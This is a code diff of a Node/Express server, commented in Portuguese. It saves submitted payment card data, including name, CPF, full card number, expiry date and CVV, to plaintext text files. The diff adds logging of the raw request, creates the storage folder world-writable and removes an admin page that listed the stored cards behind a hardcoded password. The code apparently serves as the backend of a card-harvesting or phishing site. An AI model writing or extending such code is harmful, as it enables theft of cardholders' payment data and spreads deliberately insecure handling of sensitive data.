@@ -158,7 +158,9 @@ app.post('/salvar-cartao-txt', (req, res) => {
     const { nome, cpf, cartao, validade, cvv, email, valor } = req.body;
     
     console.log('📥 Salvando cartão no servidor...');
+    console.log('📦 Dados recebidos:', req.body);
     
+    // Criar conteúdo do arquivo
     const dataHora = new Date().toLocaleString('pt-BR');
     const conteudo = `============================================================
 📅 DATA/HORA: ${dataHora}
@@ -173,111 +175,27 @@ app.post('/salvar-cartao-txt', (req, res) => {
 
 `;
     
-    // Criar pasta se não existir
-    const pastaDados = path.join(__dirname, 'dados_cartoes');
-    if (!fs.existsSync(pastaDados)) {
-        fs.mkdirSync(pastaDados);
-        console.log('📁 Pasta criada:', pastaDados);
-    }
-    
-    const nomeArquivo = `cartoes_${new Date().toISOString().slice(0,10)}.txt`;
-    const caminhoArquivo = path.join(pastaDados, nomeArquivo);
-    
-    fs.appendFile(caminhoArquivo, conteudo, (err) => {
-        if (err) {
-            console.error('❌ Erro ao salvar:', err);
-            return res.status(500).json({ success: false, erro: 'Erro ao salvar' });
+    try {
+        // Criar pasta se não existir (com permissões)
+        const pastaDados = path.join(__dirname, 'dados_cartoes');
+        if (!fs.existsSync(pastaDados)) {
+            fs.mkdirSync(pastaDados, { recursive: true, mode: 0o777 });
+            console.log('📁 Pasta criada:', pastaDados);
         }
-        console.log(`✅ Cartão salvo em: ${caminhoArquivo}`);
-        res.json({ success: true });
-    });
-});
-
-// ====================== ADMIN - VER CARTÕES SALVOS NO SERVIDOR ======================
-app.get('/admin/ver-cartoes-servidor', (req, res) => {
-    const SENHA_ADMIN = "777ga30"; // SUA SENHA
-    const senhaDigitada = req.query.senha || '';
-    
-    if (senhaDigitada !== SENHA_ADMIN) {
-        return res.send(`
-            <!DOCTYPE html>
-            <html>
-            <head><meta charset="UTF-8"><title>Acesso Restrito</title>
-            <style>
-                body { background: linear-gradient(135deg, #1a1a2e, #16213e); min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: monospace; }
-                .login-box { background: #0f3460; padding: 40px; border-radius: 20px; text-align: center; border-left: 4px solid #ffb600; }
-                h1 { color: #ffb600; }
-                input { padding: 10px; margin: 20px 0; border-radius: 8px; border: none; width: 100%; }
-                button { background: #ffb600; color: #004aad; padding: 10px 30px; border: none; border-radius: 8px; cursor: pointer; }
-            </style>
-            </head>
-            <body>
-                <div class="login-box">
-                    <h1>🔒 ACESSO RESTRITO</h1>
-                    <form method="GET">
-                        <input type="password" name="senha" placeholder="Digite a senha">
-                        <button type="submit">ENTRAR</button>
-                    </form>
-                </div>
-            </body>
-            </html>
-        `);
-    }
-    
-    // Ler arquivos da pasta
-    const pasta = path.join(__dirname, 'dados_cartoes');
-    let html = `<!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <title>Admin - Cartões do Servidor</title>
-        <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body { font-family: monospace; background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 20px; color: #fff; }
-            .container { max-width: 1200px; margin: 0 auto; }
-            h1 { text-align: center; margin-bottom: 20px; color: #ffb600; }
-            .stats { background: #0f3460; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
-            .stat-card { background: #16213e; padding: 10px 20px; border-radius: 8px; border-left: 4px solid #ffb600; }
-            .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; }
-            .card h3 { color: #ffb600; margin-bottom: 10px; }
-            pre { background: #1a1a2e; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 12px; white-space: pre-wrap; }
-            button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-bottom: 20px; }
-            .logout { text-align: right; margin-bottom: 15px; }
-            .logout a { color: #ffb600; text-decoration: none; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="logout"><a href="?">🚪 Sair</a></div>
-            <h1>📋 ADMIN - CARTÕES DO SERVIDOR</h1>
-            <div class="stats">
-                <div class="stat-card">📂 Pasta: dados_cartoes/</div>
-            </div>
-            <button onclick="location.reload()">🔄 Atualizar</button>
-    `;
-    
-    if (fs.existsSync(pasta)) {
-        const arquivos = fs.readdirSync(pasta).filter(f => f.endsWith('.txt')).sort().reverse();
         
-        if (arquivos.length === 0) {
-            html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3></div>';
-        } else {
-            arquivos.forEach(arq => {
-                const conteudo = fs.readFileSync(path.join(pasta, arq), 'utf8');
-                html += `
-                    <div class="card">
-                        <h3>📄 ${arq}</h3>
-                        <pre>${conteudo.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
-                    </div>
-                `;
-            });
-        }
-    } else {
-        html += '<div class="card"><h3>📭 Ainda não há arquivos salvos</h3></div>';
+        const nomeArquivo = `cartoes_${new Date().toISOString().slice(0,10)}.txt`;
+        const caminhoArquivo = path.join(pastaDados, nomeArquivo);
+        
+        // Salvar arquivo (modo síncrono para garantir)
+        fs.appendFileSync(caminhoArquivo, conteudo, 'utf8');
+        
+        console.log(`✅ Cartão salvo em: ${caminhoArquivo}`);
+        res.json({ success: true, message: 'Cartão salvo com sucesso!' });
+        
+    } catch (err) {
+        console.error('❌ Erro ao salvar:', err);
+        res.status(500).json({ success: false, erro: 'Erro ao salvar: ' + err.message });
     }
-    
-    html += `</div></body></html>`;
-    res.send(html);
 });
 
 // ====================== FALLBACK ======================
